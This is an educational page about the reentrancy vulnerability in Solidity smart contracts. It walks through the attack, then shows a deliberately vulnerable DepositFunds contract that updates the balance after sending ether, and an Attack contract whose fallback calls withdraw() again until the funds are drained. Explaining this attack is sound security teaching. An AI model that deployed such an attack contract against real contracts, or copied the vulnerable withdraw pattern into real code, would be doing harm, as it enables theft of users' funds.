---
description: 'Reference: https://hackernoon.com/hack-solidity-reentrancy-attack'
---

# Scenarios

### Reentrancy Attack Scenario

\


1. The vulnerable smart contract has 10 eth.
2. An attacker stores 1 eth using the deposit function.
3. An attacker calls the withdraw function and points to a malicious contract as a recipient.
4.  Now withdraw function will verify if it can be executed:

    \


* Does the attacker have 1 eth on their balance? Yes – because of their deposit.
* Transfer 1 eth to a malicious contract. (Note: attacker balance has NOT been updated yet)
*   Fallback function on received eth calls withdraw function again.

    \


1.  Now withdraw function will verify if it can be executed:

    \


* Does the attacker have 1 eth on their balance? Yes – because the balance has not been updated.
* Transfer 1 eth to a malicious contract.
* and again until the attacker will drain all the funds stored on the contract

\


Below is the contract, which contains the reentrancy vulnerability.

\


```javascript
contract DepositFunds {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }


}
```

\


The vulnerability comes where we send the user their requested amount of ether. In this case, the attacker calls withdraw() function. Since his balance has not yet been set to 0, he is able to transfer the tokens even though he has already received tokens.

\


Now, let's consider a malicious attacker creating the following contract.

\


```javascript
contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }


}
```

\


The attack function calls the withdraw function in the victim’s contract. When the token is received, the fallback function calls back the withdraw function. Since the check is passed contract sends the token to the attacker, which triggers the fallback function.

\
